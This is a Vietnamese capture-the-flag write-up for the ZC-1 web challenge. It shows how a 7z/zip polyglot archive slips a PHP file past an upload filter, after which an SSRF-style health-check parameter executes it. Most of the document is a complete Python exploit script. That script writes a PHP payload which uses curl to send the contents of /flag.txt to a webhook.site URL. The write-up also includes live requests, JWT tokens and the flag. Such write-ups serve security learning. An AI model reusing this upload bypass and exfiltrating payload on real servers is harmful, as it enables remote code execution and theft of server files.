# ZC-1

<img width="916" height="844" alt="image" src="https://github.com/user-attachments/assets/54fe2dfe-8da8-4ab2-bf86-ca1cc27d22d8" />

Giao diện của trang web sau khi truy cập thông qua trình duyệt:

<img width="618" height="328" alt="image" src="https://github.com/user-attachments/assets/b8292884-cf91-4fe1-b6c9-de2a05da84eb" />

Ở đây có `create(self, request: Request, *args, **kwargs)` là để tạo tài khoản:

<img width="785" height="818" alt="image" src="https://github.com/user-attachments/assets/c0c6ea14-32b6-42c1-9027-9c8beefbbb3a" />

<img width="688" height="274" alt="image" src="https://github.com/user-attachments/assets/21ebd319-a7c5-4d15-8c62-94e9adf19e66" />

Tôi tạo tài khoản và lấy token:

```
❯ curl -sX POST "http://web2.cscv.vn:8000/gateway/user/" -H "Content-Type: application/json" -d '{"username":"lmaolmao", "password":"lmaolmao", "email":"nam@nam.nam"}'
"lmaolmao"%
❯ curl -s http://web2.cscv.vn:8000/auth/token/ -H 'Content-Type: application/json' -d '{"username":"lmaolmao","password":"lmaolmao"}'
{"refresh":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTc2MTA1ODUzOCwiaWF0IjoxNzYwOTcyMTM4LCJqdGkiOiI3OGUwOGFjOGU1ZDc0ZmNjYmY4ZTExNWQ2OWI3ZjhhOCIsInVzZXJfaWQiOiI4MjljOTMwMC1jMjFiLTQ3YmMtODQ5OC01ZGM1Y2FjMGVlOWMifQ.SApWgabKnsnbB3gx4g1l9SX6vbOLsTPmjg0ZtJvC9o4","access":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzYwOTcyNDM4LCJpYXQiOjE3NjA5NzIxMzgsImp0aSI6ImJkNzYxNmVmOTNlNjQ1ZjViMGVlY2Q4Y2Q5OGEyYzUwIiwidXNlcl9pZCI6IjgyOWM5MzAwLWMyMWItNDdiYy04NDk4LTVkYzVjYWMwZWU5YyJ9.q7qnGc5_aua2dDgNlDaFs6IJvVRMzz-AN0fZ7qi4Ti4"}% 
```

Ngoài ra web còn có tính năng upload file và health check:

```
from django.conf import settings
import requests
import zipfile

storage_url = settings.STORAGE_URL
allow_storage_file = settings.ALLOW_STORAGE_FILE

def transport_file(id, file):
    try:
        res = requests.post(
            url= storage_url + "/storage.php",
            files={
                "id":(None,id),
                "file":file
            },
            allow_redirects=False,
            timeout=2
        )
        return "OK"
    except Exception as e:
        return "ERR"


def check_file(file):
    try:
        with zipfile.ZipFile(file,"r") as zf:
            namelist = zf.namelist()
            if len([f for f in namelist if not f.endswith(allow_storage_file)]) > 0:
                return False
    except:
        return False

    return True


def health_check(module):
    try:
        res = requests.get(storage_url + module, timeout=2)
        if res.status_code == 200:
            return True
        return False
    except:
        return False
```

Các file được cho qua là `".txt",".docx",".png",".jpg",".jpeg"`

<img width="1384" height="807" alt="image" src="https://github.com/user-attachments/assets/1e6fb3ba-199c-4084-804a-38a4518b30fc" />

Ở chỗ `health_check` có thể thay đổi file php để thực thi tùy ý hoặc có thể khai thách ssrf, nếu thành công thì trả về kết quả là "OK" còn không được thì là "ERR":

Còn ở phần upload file thì là upload file được nén, sau đó Archive7z giải nén và xử lý các file trong đó: 

<img width="1267" height="775" alt="image" src="https://github.com/user-attachments/assets/bd0f4104-1673-4a58-9952-7e279981b2c6" />

Để bypass được thì ở đây tôi chuẩn bị 3 file gồm 2 file zip và 1 file 7z, trong đó `file.zip` là file được nối bytes từ `payload.7z` và `payload.zip`:

<img width="494" height="936" alt="image" src="https://github.com/user-attachments/assets/0aa13a9c-1813-435a-a815-f9e0dfe61eec" />

Ở đây thì server sẽ kiểm tra file `file.zip` thì thấy đây là file zip và kiểm tra bên trong thì là nội dung của `payload.zip`, bên trong hoàn toàn legit vì bên trong có file `readme.txt`, khi giải nén thì giải nén file 7z, tức là file `payload.7z` chứa `payload.php`

Sau đó truy cập vào `/gateway/health/?module=/storage/uuid/payload.php` để thực thi payload, uuid thì nằm ở token

Ở đây tôi chuẩn bị `exploit.py` để làm cho nhanh:

```
import asyncio
import os
import re
import json
import base64
import shutil
import zipfile
from pathlib import Path
from typing import Optional
import httpx
import subprocess


BASE_URL = os.getenv("TARGET_BASE_URL", "http://web2.cscv.vn:8000")
USERNAME = os.getenv("TARGET_USERNAME", "lmaolmao")
PASSWORD = os.getenv("TARGET_PASSWORD", "lmaolmao")

SHELL_NAME = os.getenv("SHELL_NAME", "payload.php")

ROOT = Path.cwd()
PAYLOAD_DIR = ROOT / "payload"
OUT_DIR = ROOT / "out"
IN_DIR = ROOT / "in"
PAYLOAD_PHP = PAYLOAD_DIR / SHELL_NAME
SEVENZ_PATH = OUT_DIR / "payload.7z"
ZIP_PATH = OUT_DIR / "payload.zip"
POLYGLOT_PATH = OUT_DIR / "file.zip"


def _b64url_decode(data: str) -> bytes:
    # Bổ sung padding nếu thiếu
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)

def parse_access_claims(access_token: str) -> dict:
    try:
        parts = access_token.split(".")
        if len(parts) != 3:
            raise ValueError("JWT không hợp lệ")
        payload_raw = _b64url_decode(parts[1])
        return json.loads(payload_raw.decode("utf-8"))
    except Exception as e:
        raise RuntimeError(f"Không đọc được payload của access token: {e}") from e


async def authentication(client: httpx.AsyncClient) -> str:
    resp = await client.post(
        "/auth/token/",
        json={"username": USERNAME, "password": PASSWORD},
        timeout=20,
    )
    resp.raise_for_status()
    data = resp.json()
    token = data.get("access")
    if not token:
        raise RuntimeError("Không lấy được access token từ /auth/token/")
    client.headers["Authorization"] = f"Bearer {token}"
    return token

def clean_dirs() -> None:
    for p in (PAYLOAD_DIR, OUT_DIR, IN_DIR):
        shutil.rmtree(p, ignore_errors=True)
        p.mkdir(parents=True, exist_ok=True)

def write_payload_php() -> None:
    PAYLOAD_PHP.write_text(
        (
            "<?php "
            "header('Content-Type: text/plain'); "
            "echo 'OK'; "
            "system('curl https://webhook.site/f7b14c93-2995-48d4-9fcb-5e3002659fbd"
            "?flag=' . urlencode(@file_get_contents('/flag.txt'))); "
            "?>"
        ),
        encoding="utf-8"
    )

def build_7z_from_payload() -> None:
    try:
        subprocess.run(
            ["7z", "a", "-snl", str(SEVENZ_PATH), "."],
            cwd=str(PAYLOAD_DIR),
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )
    except FileNotFoundError as e:
        raise RuntimeError("Không tìm thấy lệnh '7z'. Hãy cài đặt p7zip/7-Zip.") from e
    except subprocess.CalledProcessError as e:
        raise RuntimeError("Lỗi khi tạo payload.7z") from e

def build_legit_zip() -> None:
    (IN_DIR / "readme.txt").write_text(
        "This is a benign file inside a normal ZIP.\n", encoding="utf-8"
    )
    shutil.make_archive(OUT_DIR / "payload", "zip", IN_DIR)

def make_polyglot_7z_zip() -> None:
    with POLYGLOT_PATH.open("wb") as out_f:
        with SEVENZ_PATH.open("rb") as f7z:
            shutil.copyfileobj(f7z, out_f)
        with ZIP_PATH.open("rb") as fzip:
            shutil.copyfileobj(fzip, out_f)

def check_zip_readable() -> None:
    try:
        with POLYGLOT_PATH.open("rb") as f:
            with zipfile.ZipFile(f, "r") as zf:
                print("ZIP namelist:", zf.namelist())
    except Exception as e:
        print("Error reading ZIP:", e)

async def send_zip(client: httpx.AsyncClient) -> httpx.Response:
    with POLYGLOT_PATH.open("rb") as f:
        files = {"file": (POLYGLOT_PATH.name, f, "application/zip")}
        resp = await client.post("/gateway/transport/", files=files, timeout=60)
    resp.raise_for_status()
    return resp

async def trigger_via_health(client: httpx.AsyncClient, user_uuid: str, shell_name: str) -> httpx.Response:
    params = {"module": f"/storage/{user_uuid}/{shell_name}"}
    resp = await client.get("/gateway/health/", params=params, timeout=30, follow_redirects=True)
    resp.raise_for_status()
    return resp

async def health_check(client: httpx.AsyncClient) -> Optional[str]:
    try:
        resp = await client.get("/gateway/health/", timeout=10)
        resp.raise_for_status()
        return resp.text
    except Exception as e:
        return f"Health check failed: {e}"

async def main() -> None:
    clean_dirs()
    write_payload_php()
    build_7z_from_payload()
    build_legit_zip()
    make_polyglot_7z_zip()
    check_zip_readable()

    async with httpx.AsyncClient(base_url=BASE_URL, timeout=20) as client:
        access = await authentication(client)
        claims = parse_access_claims(access)
        user_uuid = claims.get("user_id")
        if not user_uuid or not re.match(r"^[0-9a-fA-F\-]{36}$", user_uuid):
            raise RuntimeError(f"user_id trong access token không phải UUID hợp lệ: {user_uuid!r}")
        print(f"[i] user_id (UUID) từ access token: {user_uuid}")

        print(f"[i] Uploading: {POLYGLOT_PATH.name}")
        upload_resp = await send_zip(client)
        body = upload_resp.text or ""
        print("[+] Upload status:", upload_resp.status_code)
        print("[i] Upload body (excerpt):", (body[:300] + ("..." if len(body) > 300 else "")))

        print(f"[i] Triggering shell via module=/storage/{user_uuid}/{SHELL_NAME}")
        exec_resp = await trigger_via_health(client, user_uuid, SHELL_NAME)
        preview = (exec_resp.text or "")[:200].replace("\n", "\\n")
        print(f"[✓] Executed. HTTP {exec_resp.status_code}. Body: {preview}{'...' if len(exec_resp.text) > 200 else ''}")

        health = await health_check(client)
        if health is not None:
            print("[i] Health:", health)


if __name__ == "__main__":
    asyncio.run(main())

```

<img width="1068" height="573" alt="image" src="https://github.com/user-attachments/assets/a4a7e79f-b7ea-4e8e-9ad4-ffc9ca0ef4b1" />

```
CSCV2025{Z1p_z1P_21p_Ca7_c47_c@t__}
```
